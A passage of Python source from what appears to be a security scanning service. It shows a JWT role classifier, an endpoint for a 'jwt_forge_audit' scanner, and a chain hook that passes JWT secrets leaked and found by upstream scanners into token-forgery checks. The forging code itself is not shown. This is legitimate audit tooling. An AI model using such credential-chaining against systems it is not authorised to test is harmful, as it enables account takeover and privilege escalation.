            scope_str = scope_raw.lower()
        elif isinstance(scope_raw, list):
            scope_str = " ".join(str(s).lower() for s in scope_raw)
        if "admin:*" in scope_str or scope_str.strip() == "*" or " * " in f" {scope_str} ":
            return "admin"

        # sub matches admin pattern
        sub = str(payload.get("sub") or "").lower()
        if re.search(r"\b(admin|root|administrator|superuser)\b", sub):
            return "admin"

        return "user"


# ════════════════════════════════════════════════════════════════════
#  Endpoint wrapper
# ════════════════════════════════════════════════════════════════════


@router.post("/api/password/jwt_forge_audit")
async def password_jwt_forge_audit(req: JwtForgeAuditRequest,
                                    _=Depends(verify_scan_quota)):
    scanner = JwtForgeAudit()
    return await scanner.run_as_endpoint(
        req,
        finding_rules=JWT_FORGE_AUDIT_FINDING_RULES,
        intel_fields=INTEL_FIELDS,
    )


def register(app):
    app.include_router(router)


# ════════════════════════════════════════════════════════════════════
#  Chain registry registration - upstream scanners (exposed_env_scan
#  finding a jwt_secret env var, secret_leak_audit, etc.) trigger us
#  via _chain_callable.
# ════════════════════════════════════════════════════════════════════


async def _chain_callable(target: str, options: dict, jwt_token=None) -> dict:
    """ChainExecutor entry point - upstream scanners trigger us via this
    wrapper. If upstream discovered a jwt_secret it lands in
    chain_creds[0].pwd; we promote it to options.jwt_secret."""
    opts = options or {}
    # If upstream scanner discovered a jwt_secret, inherit it
    if not opts.get("jwt_secret") and (opts.get("chain_creds") or []):
        cred = opts["chain_creds"][0]
        if cred.get("pwd"):
            opts["jwt_secret"] = cred["pwd"]
    req = JwtForgeAuditRequest(target=target, options=opts)
    scanner = JwtForgeAudit()
    return await scanner.run_as_endpoint(
        req,
        finding_rules=JWT_FORGE_AUDIT_FINDING_RULES,
        intel_fields=INTEL_FIELDS,
    )


from tools._methodology import chain_registry
chain_registry.register("jwt_forge_audit", _chain_callable)
